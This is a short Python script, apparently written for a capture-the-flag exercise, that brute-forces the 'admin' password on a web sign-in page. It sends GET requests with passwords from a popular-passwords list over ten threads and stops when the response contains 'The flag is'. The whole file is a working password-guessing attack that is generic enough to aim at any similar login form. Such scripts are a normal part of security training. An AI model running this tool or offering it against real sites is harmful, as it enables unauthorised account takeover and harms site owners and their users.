import requests
import argparse
from concurrent.futures import ThreadPoolExecutor

def test_password(word, ip, session):
    word = word.strip()
    print(word)
    params = {
        "page": "signin",
        "username": "admin",
        "password": word,
        "Login": "Login"
    }

    try:
        response = session.get(f"http://{ip}/", params=params)

        if "The flag is" in response.text:
            print(f"[+] Mot de passe trouvé: {word}")
            return word
    except:
        pass

def brute_force(ip):
    dictionary_path = 'most-popular-passwords.txt'

    with open(dictionary_path, 'r') as file:
        words = file.readlines()

    session = requests.Session()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_password, word, ip, session) for word in words]

        for future in futures:
            result = future.result()
            if result:
                print(f"[✓] SUCCESS: {result}")
                executor.shutdown(wait=False)
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bruteforce script")
    parser.add_argument("ip", help="IP of the targeted site")
    args = parser.parse_args()

    brute_force(args.ip)